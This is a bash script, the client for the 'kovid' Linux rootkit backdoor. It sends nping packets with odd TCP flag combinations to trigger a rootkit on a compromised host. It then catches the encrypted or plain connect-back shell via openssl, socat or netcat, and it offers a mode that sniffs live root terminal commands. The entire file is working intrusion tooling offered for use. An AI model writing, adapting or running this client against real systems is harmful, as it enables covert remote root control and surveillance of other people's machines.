#!/usr/bin/env bash
#
# kovid backdoors client

# Copy this script to somewhere on the
# host machine and execute it from there.
#
# ./bdclient.sh
#
# -hash

set -eou pipefail

PREFIX="/${0%/*}"
PREFIX=${PREFIX:-.}
PREFIX=${PREFIX#/}/
PREFIX=$(cd "$PREFIX"; pwd)

OPENSSL="openssl"
SOCAT="socat"
NC="nc"
NPING="nping"
PERMDIR=$PREFIX/certs

# Destination ports for
# nping packets
RR_OPENSSL=443
RR_SOCAT=444
RR_SOCAT_TTY=445
RR_NC=80

# Verbose mode
V=${V:-}

function gencerts() {
    # One-time op
    mkdir -p "$PERMDIR"
    $OPENSSL req -newkey rsa:2048 -nodes -keyout "$PERMDIR"/server.key -x509 -days 30 -out "$PERMDIR"/server.crt
    cat "$PERMDIR"/server.key "$PERMDIR"/server.crt > "$PERMDIR"/server.pem
    #s_server
    $OPENSSL req -x509 -newkey rsa:2048 -keyout "$PERMDIR"/key.pem -out "$PERMDIR"/cert.pem -days 365 -nodes
}
usage="Use: [V=1] ./${0##*/} <method> <IP> <PORT>

    Methods:
        openssl:    OpenSSL encrypted connect-back shell
        socat:      Socat encrypted connect-back shell
        nc:         Netcat unencrypted connect-back shell
        tty:        Encrypted non-interactive ROOT section sniffing
                    for remote root live terminal commands dump

    IP:
        Remote IP address where rootkit is listening

    Port:
        Local port for connect-back session - must be unfiltered

    Example:
        ./${0##*/} openssl 192.168.1.10 9999

    Verbose, example:
        V=1 ./${0##*/} openssl 192.168.1.10 9999"

errexit() {
    echo "Error: $1"
    if [[ "$2" == true ]]; then
        echo "$usage"
    fi
    exit "$3"
} >&2

check_util() {
    for u in "$@"; do
        if [[ ! $(which "$u") ]]; then
            echo "Error: $u not found"
            exit 1
        fi
    done
} >&2

if [[ "$#" -ne 3 ]]; then
    errexit "Missing parameter" true 1
fi

if [[ "$UID" != 0 ]]; then
    errexit "nping settings we use require root" false 1
fi

check_certs() {
    if  [[ ! -f "$PERMDIR"/server.key ]]; then
        gencerts
    fi
}

case $1 in
    openssl)
        shift
        check_util "$OPENSSL" "$NPING"
        check_certs
        f() {
            sleep 2
            [[ ! -n "$V" ]] && exec &>/dev/null
            "$NPING" "$1" --tcp -p "$RR_OPENSSL" --flags Ack,rSt,pSh \
                --source-port "$2" -c 1
        }
        f "$@" &
        pushd "$PERMDIR" >/dev/null && {
            "$OPENSSL" s_server -key key.pem -cert cert.pem -accept "$2"
            popd >/dev/null
        }
        ;;
    socat)
        shift
        check_util "$OPENSSL" "$SOCAT" "$NPING"
        check_certs
        f() {
            sleep 2
            [[ ! -n "$V" ]] && exec &>/dev/null
            "$NPING" "$1" --tcp -p "$RR_SOCAT" --flags Fin,Urg,aCK \
                --source-port "$2" -c 1
        }
        f "$@" &
        pushd "$PERMDIR" >/dev/null && {
            "$SOCAT" -d -d OPENSSL-LISTEN:"$2",cert=server.pem,verify=0,fork STDOUT
            popd >/dev/null
        }
        ;;
    nc)
        shift
        check_util "$NC" "$NPING"
        f() {
            sleep 2
            [[ ! -n "$V" ]] && exec &>/dev/null
             "$NPING" "$1" --tcp -p "$RR_NC" --flags Ack,rSt,pSh \
                 --source-port "$2" -c 1
        }
        f "$@" &
        "$NC" -lvp "$2"
        ;;
    tty)
        shift
        check_util "$OPENSSL" "$SOCAT" "$NPING"
        check_certs
        f() {
            sleep 2
            [[ ! -n "$V" ]] && exec &>/dev/null
            "$NPING" "$1" --tcp -p "$RR_SOCAT_TTY" --flags Cwr,Urg,fiN,rsT \
                --source-port "$2" -c 1
        }
        f "$@" &
        pushd "$PERMDIR" >/dev/null && {
            "$SOCAT" -d -d OPENSSL-LISTEN:"$2",cert=server.pem,verify=0,fork STDOUT
            popd >/dev/null
        }
        ;;
    *)
        errexit "Invalid parameter" true 1
        ;;
esac

